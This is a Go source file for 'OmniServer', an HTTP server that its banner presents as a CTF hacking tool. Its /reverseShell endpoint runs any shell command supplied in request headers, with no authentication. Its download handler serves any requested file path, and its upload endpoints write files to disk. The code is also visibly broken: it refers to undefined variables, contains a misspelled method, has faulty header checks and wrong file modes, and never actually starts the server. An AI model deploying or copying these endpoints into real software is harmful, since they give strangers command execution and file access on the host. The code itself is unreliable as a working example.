package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"mime"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func downloadFileHandler() http.HandlerFunc {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var requestedFile string
		wd, err := os.Getwd()
		checkError(err, 0)
		if r.Method != http.MethodGet {
			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
			err := fmt.Errorf("Incorrect method used %s for /downloadFileHandler", r.Method)
			checkError(err, 0)
			return
		}
		r.Header.Add("File", "")

		if r.Header.Get("File") != "" {
			requestedFile = r.Header.Get("File")
		} else {
			err := fmt.Errorf("Empty File Header for downloadFileHandler from ...")
			checkError(err, 0)
		}
		pathToRequestedFile := wd + requestedFile
		exists, err := checkFileExists(pathToRequestedFile)
		checkError(err, 0)
		if !exists {
			http.NotFound(w, r)
			defer log.Printf("Failed to Download file: %v from %v - requested by: %v, %v, %v\n", requestedFile, requestedURL, clientIP, clientMAC, clientUA)
		} else {
			// fs, err := http.ServerFileFS(w,r,  )
			defer log.Printf("Downloading file at: %v from: %v - requested by: %v, %v, %v\n", requestedFile, requestedURL, clientIP, clientMAC, clientUA)
		}
		log.Printf("Successfully Downloaded File - %v by %v - %v ; Started: %v and Ended %v\n", requestedFile, clientIP, clientMAC)
	})
}

func lsTmpDir() {
	tmpDir := os.TempDir()
	output, err := os.ReadDir(tmpDir)
	checkError(err, 0)
	log.Printf("The contents of the host system's temporary directory: %s", output)
}

func sha256AFile(filepath string) (result string, err error) {
	os := runtime.GOOS
	switch os {
	case "windows":
		cmd := exec.Command("certutil.exe", "-hashfile", filepath, "SHA256")
		output, err := cmd.CombinedOuput()
		checkError(err, 0)
		outputAsString := string(output)
		outputSlice := strings.Split(outputAsString, "\n")
		result = outputSlice[1]
	case "linux":
		cmd := exec.Command("sha256sum", "", filepath)
		output, err := cmd.CombinedOuput()
		checkError(err, 0)
		outputAsString := string(output)
		outputSlice := strings.Split(outputAsString, " ")
		result = outputSlice[0]
	default:
		err := fmt.Errorf("The OS %s is unsupported for hashing files with sha256", os)
		checkError(err, 0)
	}
	return result, nil
}

func reverseShellHandler() http.HandlerFunc {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var shell, args, payload string
		if r.Method != http.MethodPost {
			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
			err := fmt.Errorf("Incorrect method used %s for /reverseShellHandler", r.Method)
			checkError(err, 0)
			return
		}

		r.Header.Add("Shell", "")
		r.Header.Add("Args", "")
		r.Header.Add("Payload", "")

		if r.Header.Get("Shell") != "" {
			shell = r.Header.Get("Shell")
		} else {
			err := fmt.Errorf("Empty Shell Header for reverseShellHandler from ...")
			checkError(err, 0)
		}
		if r.Header.Get("File") != "" {
			args = r.Header.Get("Args")
		} else {
			err := fmt.Errorf("Empty Args Header for reverseShellHandler from ...")
			checkError(err, 0)
		}
		if r.Header.Get("File") != "" {
			payload = r.Header.Get("Payload")
		} else {
			err := fmt.Errorf("Empty Payload Header for reverseShellHandler from ...")
			checkError(err, 0)
		}
		err := reverseShell(shell, args, payload)
		checkError(err, 0)
	})
}

func reverseShell(shell, args, payload string) (err error) {
	os := runtime.GOOS
	switch os {
	case "windows":
		cmd := exec.Command(shell, args, payload)
		err := cmd.Run()
		checkError(err, 0)
		return nil
	case "linux":
		cmd := exec.Command(shell, args, payload)
		err := cmd.Run()
		checkError(err, 0)
		return nil
	default:
		err := fmt.Errorf("The provided Shell: %s ---- Args: %s ---- Payload: %s ---- were incorrect in some way", shell, args, payload)
		checkError(err, 0)
	}
	return err
}

// TODO - Thinking about errors
func uploadFileHandler() http.HandlerFunc {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var maxUploadSize int64 = 10 * 1024 // 10 Mb
		tmpDir := os.TempDir()
		wd, err := os.Getwd()
		checkError(err, 0)
		http.FileServer(http.Dir(tmpDir))
		log.Printf("Temporary File server started at %s for uploading files\n", tmpDir)

		if r.Method != http.MethodPost {
			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
			err := fmt.Errorf("Incorrect method used %s for /uploadFileHandler", r.Method)
			checkError(err, 0)
			return
		}

		file, fileHeader, err := r.FormFile("filename")
		checkError(err, 0)
		log.Printf("/tmp/%s - Upload requested by ...\n")
		defer file.Close()

		fileSize := fileHeader.Size
		log.Printf("File size (bytes): %v\n", fileSize)
		if fileSize > maxUploadSize {
			writerRespondError(w, "FILE_TOO_LARGE", http.StatusBadRequest)
		}

		fileBytes, err := io.ReadAll(file)
		checkError(err, 0)

		detectedFileType := http.DetectContentType(fileBytes)
		switch detectedFileType {
		case "/", "":
			log.Printf("No file type detected by Go STDLIB http.DetectContentType - first 512 bytes parsed")
			log.Printf("This section is here in case of modification based of requiring specific file types")
			break
		default:
			log.Printf("The detected file type by OmniServer's use of go's http.DetectContentType was: %s", detectedFileType)
			writerRespondError(w, "INVALID_FILE_TYPE", http.StatusBadRequest)
		}

		fileEndings, err := mime.ExtensionsByType(detectedFileType)
		if err != nil {
			log.Printf("mime.ExtensionsByType() cannot read %s", fileEndings)
			writerRespondError(w, "CANT_READ_FILE_TYPE", http.StatusInternalServerError)
		}
		log.Printf("FileType: %s, File: %s\n", detectedFileType)
		if err := r.ParseMultipartForm(maxUploadSize); err != nil {
			log.Printf("Could not parse multipart form: %v\n", err)
			writerRespondError(w, "CANT_PARSE_FORM", http.StatusInternalServerError) // DO I want to send errors out - compile flags!
		}
		log.Print("File upload request successfully made by: ")
		log.Printf("Uploaded File: %+v\n", fileHeader.Filename)
		log.Printf("File Size: %+v\n", fileSize)
		log.Printf("MIME Header: %+v\n", fileEndings)

		// Create a temporary file tmp directory that conforms to a naming scheme
		log.Printf("File upload to temporary file creation started\n")
		tempFile, err := os.CreateTemp(tmpDir, "tmp-")
		checkError(err, 0)
		defer tempFile.Close()
		defer os.Remove(tempFile.Name())
		log.Printf("Successfully uploaded file as a temporary file to %s - %s \n", tmpDir, tempFile.Name())

		// Reasons for writing to another file is that we can then can byte parser code here to parse the file for something CTFy...
		// sha256 hashing for the file also adds a layer of checks regarding packet skull hole-pokery that prevent worms to prevent file compromise
		log.Printf("Attempting to SHA256 hash the file %s/%s and store it the currect working directory of OmniServer - %s \n", tmpDir, tempFile.Name(), wd)
		currTmpFile := tmpDir + tempFile.Name()
		fileBytes, err = os.ReadFile(currTmpFile)
		checkError(err, 0)
		hashedFilename, err := sha256AFile(currTmpFile) //
		checkError(err, 0)
		log.Printf("Successfully hashed %s as %s\n", tempFile.Name(), hashedFilename)
		log.Printf("Coverting from temporary to regular File - %s to %s - a SHA256\n", tempFile.Name(), hashedFilename)
		wdAndFilename := wd + hashedFilename
		err = os.WriteFile(wdAndFilename, fileBytes, 611)
		checkError(err, 0)
		exists, err := checkFileExists(wdAndFilename)
		checkError(err, 0)
		if !exists {
			err := fmt.Errorf("Uploaded file does not exist in the work directory as filepath %s", wdAndFilename)
			checkError(err, 0)
		}
		defer log.Printf("Successfully saved uploaded temporary file: %s to %s\n", currTmpFile, wdAndFilename)
		defer log.Printf("Successfully removed temporary file: %s\n", currTmpFile)
		defer lsTmpDir()
	})
}

func saveReqBodyFileHandler() http.HandlerFunc {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
			err := fmt.Errorf("Incorrect method used %s for /saveReqBodyFileHandler", r.Method)
			checkError(err, 0)
			return
		}
		tmpDir := os.TempDir()
		http.FileServer(http.Dir(tmpDir))
		log.Printf("Temporary File server started at %s for uploading files\n", tmpDir)
		r.Body = http.MaxBytesReader(w, r.Body, 1048576)
		tempFile, err := os.CreateTemp(tmpDir, "tmp-")
		checkError(err, 0)
		defer tempFile.Close()
		defer os.Remove(tempFile.Name())
		log.Printf("Successfully Saved Request Body to File - %s \n", tempFile.Name())
		fullTempFilePath := tmpDir + tempFile.Name()
		hashedFilename, err := sha256AFile(fullTempFilePath)
		checkError(err, 0)
		wd, err := os.Getwd()
		checkError(err, 0)
		fullPathWithExt := wd + hashedFilename + ".req"
		checkError(err, 0)
		fileBytes, err := os.ReadFile(fullTempFilePath)
		checkError(err, 0)
		err = os.WriteFile(fullPathWithExt, fileBytes, 611)
		checkError(err, 0)
		defer log.Println("Saved Request Body to a finalize hashed filename at %s", fullPathWithExt)
	})
}

func createDefaultWebServerMux() *http.ServeMux {
	mux := http.NewServeMux()
	mux.HandleFunc("/upload", uploadFileHandler())
	mux.HandleFunc("/download", downloadFileHandler())
	mux.HandleFunc("/saveReqBody", saveReqBodyFileHandler())
	mux.HandleFunc("/reverseShell", reverseShellHandler())
	return mux
}

func initServerContext(lportString, keyServerAddr string) (*http.Server, context.Context, context.CancelFunc, error) {
	ctx, cancelCtx := context.WithCancel(context.Background())
	server := &http.Server{
		Addr:    lportString,
		Handler: createDefaultWebServerMux(),
		BaseContext: func(l net.Listener) context.Context {
			ctx = context.WithValue(ctx, keyServerAddr, l.Addr().String())
			return ctx
		},
	}
	return server, ctx, cancelCtx, nil
}

func runHTTPServer(args []string) (*http.Server, context.Context, context.CancelFunc, error) {
	log.Println("--- Building HTTP Server ---")
	httpServer, ctx, cancelCtx, err := initServerContext(args[4], args[3])
	checkError(err, 0)
	log.Println("--- Server Built for %v created ---", httpServer)
	return httpServer, ctx, cancelCtx, nil
}

func validateTLS(args string) (string, error) {
	fmt.Println("validating TLS")
	return "TLS incoming", nil
}

func runHTTPSServer(nontlsArgs []string, tls string) (*http.Server, context.Context, context.CancelFunc, error) {
	log.Println("--- Building HTTP Server ---")
	validateTLS(tls)
	httpsServer, ctx, cancelCtx, err := initServerContext(nontlsArgs[4], nontlsArgs[3])
	checkError(err, 0)
	log.Println("--- Server Built for %v created ---", httpsServer)
	return httpsServer, ctx, cancelCtx, nil
}

func gracefulExit(server *http.Server, context context.Context, cancel context.CancelFunc) error {
	fmt.Println("SIG THIS or something fanciy please!")
	return nil
}

func prependColonToPortNumber(port string) string {
	builder := strings.Builder{}
	builder.WriteString(":" + port)
	listeningPort := builder.String()
	builder.Reset()
	return listeningPort
}

// Everything is fatal till EVERYTHING WORKS relax those switch statement fingers custom error switch
// Use regex `(err, \d)` to find and change incrementally later - the error code make life easier after all ALWAYS err.New or err.Errorf
//
// # A list of cases for need different err,0,0
//
// Some things are not FATAL
// Some things are are FATAL
// http.Writer Errors need to return based on needing to respond
func checkError(err error, errorCode int) {
	if err != nil {
		log.Fatal(err, " - Error code: ", errorCode)
	}
}

// renderError factorisation from - https://github.com/zupzup/golang-http-file-upload-download/blob/main/main.go
func writerRespondError(w http.ResponseWriter, message string, statusCode int) {
	w.WriteHeader(statusCode)
	w.Write([]byte(message))
}

// TODO This is not connected to the design - fix
func checkFileExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err != nil {
		log.Fatal(err)
		return false, err
	}
	if os.IsNotExist(err) {
		log.Fatal("File path does not exist")
		return false, err
	}
	return true, nil
}

func checkValidPort(portStr string) bool {
	portInt, err := strconv.Atoi(strings.ReplaceAll(portStr, ":", ""))
	checkError(err, 0)
	if portInt <= 65535 && portInt > -1 {
		return true
	}
	return false
}

func checkValidIP(ip string) bool {
	if ip == "" {
		return false
	}
	checkIP := strings.Split(ip, ".")
	if len(checkIP) != 4 {
		return false
	}
	for _, ip := range checkIP {
		if octet, err := strconv.Atoi(ip); err != nil {
			return false
		} else if octet < 0 || octet > 255 {
			return false
		}
	}
	return true
}

func convIfconfigNameToCIDR(ifconfig *net.Interface) (string, error) {
	addrs, err := ifconfig.Addrs()
	checkError(err, 0)
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok {
			return ipNet.String(), nil
		}
	}
	return "", fmt.Errorf("No suitable IP address found")
}

func removeFlagsAndBinFromArgs(hashDelimitedArgs string) string {
	binRegex := regexp.MustCompile(`#.[\/]OmniServer#`) // This is just for CTFs please :)
	flagsRegex := regexp.MustCompile(`-\w{1}#`)
	rmBinRegexStr := binRegex.ReplaceAllString(hashDelimitedArgs, "")
	result := flagsRegex.ReplaceAllString(rmBinRegexStr, "")
	return result
}

// Validates and sorts Args to serverType, interfaceName, interfaceCIDR(retrived by this application), IP, Port, TLS
func handleArgs(args []string) ([]string, error) {
	hashDelimitedArgs := "#" + strings.Join(args, "#") + "#"
	regexSafeArgs := "#" + removeFlagsAndBinFromArgs(hashDelimitedArgs)

	fmt.Println("The result of remove binary name and flags :", regexSafeArgs)

	httpRegex := regexp.MustCompile(`http#`)
	httpsRegex := regexp.MustCompile(`https#`)
	ipRegex := regexp.MustCompile(`\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#`)
	portRegex := regexp.MustCompile(`\d{1,5}#`)
	tlsRegex := regexp.MustCompile(`#`)
	sortedArgs := make([]string, len(args))

	matchInterface := false
	matchIP, err := regexp.MatchString(ipRegex.String(), regexSafeArgs)
	checkError(err, 0)
	matchPort, err := regexp.MatchString(portRegex.String(), regexSafeArgs)
	checkError(err, 0)

	if len(args) != 11 {
		matchHTTP, err := regexp.MatchString(httpRegex.String(), regexSafeArgs)
		checkError(err, 0)
		interfaces, err := net.Interfaces()
		checkError(err, 0)

		tmpReduced := httpRegex.ReplaceAllString(regexSafeArgs, "")
		tmpReduced = ipRegex.ReplaceAllString(tmpReduced, "")
		tmpReduced = portRegex.ReplaceAllString(tmpReduced, "")
		interfaceArg := strings.ReplaceAll(tmpReduced, "#", "")
		fmt.Println(interfaceArg)
		for _, i := range interfaces {
			if i.Name == interfaceArg {
				matchInterface = true
			}
		}
		if matchInterface != true {
			err := fmt.Errorf("There is no interface named: %s", interfaceArg)
			checkError(err, 0)
		}
		ifconfig, err := net.InterfaceByName(interfaceArg)
		checkError(err, 0)
		ifconfigCIDRTmp, err := convIfconfigNameToCIDR(ifconfig)
		checkError(err, 0)
		httpAllMatched := matchHTTP && matchIP && matchPort
		if !httpAllMatched {
			err := fmt.Errorf("Arguments provided are %v: %v", httpAllMatched, args)
			return nil, err
		}
		sortedArgs[0] = strings.ReplaceAll(strings.Join(httpRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		sortedArgs[1] = interfaceArg
		sortedArgs[2] = ifconfigCIDRTmp
		sortedArgs[3] = strings.ReplaceAll(strings.Join(ipRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		sortedArgs[4] = strings.ReplaceAll(strings.Join(portRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")

		if !(checkValidIP(sortedArgs[3]) && checkValidPort(sortedArgs[4])) {
			err := fmt.Errorf("Invalid IP and Port combination: %s and %s", sortedArgs[3], sortedArgs[4])
			return nil, err
		}
		checkError(err, 0)
		return sortedArgs, nil

	} else {
		matchHTTPS, err := regexp.MatchString(httpsRegex.String(), regexSafeArgs)
		checkError(err, 0)
		interfaces, err := net.Interfaces()
		checkError(err, 0)
		tmpReduced := httpRegex.ReplaceAllString(regexSafeArgs, "")
		tmpReduced = ipRegex.ReplaceAllString(tmpReduced, "")
		tmpReduced = portRegex.ReplaceAllString(tmpReduced, "")
		tmpReduced = tlsRegex.ReplaceAllString(tmpReduced, "")
		interfaceArg := strings.ReplaceAll(tmpReduced, "#", "")
		for _, i := range interfaces {
			if i.Name == interfaceArg {
				matchInterface = true
			}
		}
		if matchInterface != true {
			err := fmt.Errorf("There is no interface named: %s", interfaceArg)
			checkError(err, 0)
		}
		ifconfig, err := net.InterfaceByName(interfaceArg)
		checkError(err, 0)
		ifconfigCIDRTmp, err := convIfconfigNameToCIDR(ifconfig)
		checkError(err, 0)
		matchTLS, err := regexp.MatchString(tlsRegex.String(), regexSafeArgs)
		checkError(err, 0)
		httpsAllMatched := matchHTTPS && matchIP && matchPort && matchTLS && matchInterface
		if !httpsAllMatched {
			err := fmt.Errorf("Arguments provided are %v: %v", httpsAllMatched, args)
			return nil, err
		}
		sortedArgs[0] = strings.ReplaceAll(strings.Join(httpRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		sortedArgs[1] = interfaceArg
		sortedArgs[2] = ifconfigCIDRTmp
		sortedArgs[3] = strings.ReplaceAll(strings.Join(ipRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		sortedArgs[4] = strings.ReplaceAll(strings.Join(portRegex.FindAllString(regexSafeArgs, 1), ""), "#", "")
		// sortedArgs[5] = TLS
		if !(checkValidIP(sortedArgs[3]) && checkValidPort(sortedArgs[4])) {
			err := fmt.Errorf("Invalid IP and Port combination: %s and %s", sortedArgs[3], sortedArgs[4])
			return nil, err
		}
		checkError(err, 0)
		return sortedArgs, nil
	}
}

func printBanner() {
	fmt.Printf("Flashy nice colorful banner with lots of 💀s")
	fmt.Printf("Beware this program uses http.ServeFileFS() visit https://pkg.go.dev/net/http#ServeFileFS - meaning that ANY file can be downloaded if requested and exists\n")
	fmt.Printf("💀 ...This Program is for CTFs - Happy Hacking :) ... 💀")
}

func printTotalRuntime(appStartTime time.Time) {
	appTerminateTime := time.Now()
	totalRuntime := 0
	// Do the mathematics idiot
	log.Printf("Application started: %v - Terminated: %v - Runtime: %v\n", appStartTime, appTerminateTime, totalRuntime)
}

func main() {
	printBanner()
	var ipAddress, serverType, tlsInputStr, netInterface string
	var portInt int
	flag.StringVar(&tlsInputStr, "t", "None", "Provide TLS information delimited by a comma - requires server type: -s https")
	flag.StringVar(&serverType, "s", "http", "Provide a server of type: http, https")
	flag.StringVar(&netInterface, "e", "lo", "Provide a Network Interface - required!")
	flag.StringVar(&ipAddress, "i", "127.0.0.1", "Provide a valid IPv4 address - required!")
	flag.IntVar(&portInt, "p", 8443, "Provide a TCP port number - required!")
	flag.Parse()

	appStartTime := time.Now()
	args, argsLen := os.Args, len(os.Args)

	if argsLen > 9 {
		flag.PrintDefaults()
		fmt.Println()
		err := fmt.Errorf("The number arguments provided was %d", argsLen)
		checkError(err, 0)
		os.Exit(1)
	}

	sortedArgs, err := handleArgs(args)
	checkError(err, 0)

	switch sortedArgs[0] {
	case "http":
		server, context, contextCancel, err := runHTTPServer(sortedArgs)
		checkError(err, 0)
		err = gracefulExit(server, context, contextCancel)
		checkError(err, 0)
		break
	case "https":
		tlsReq, err := validateTLS(sortedArgs[5])
		checkError(err, 0)
		server, context, contextCancel, err := runHTTPSServer(sortedArgs[:4], tlsReq)
		checkError(err, 0)
		err = gracefulExit(server, context, contextCancel)
		checkError(err, 0)
		break
	default:
		err := fmt.Errorf("Invalid Sorted arguments and proof at index 0: %s", sortedArgs[0])
		checkError(err, 0)
	}

	printTotalRuntime(appStartTime)
	return
}
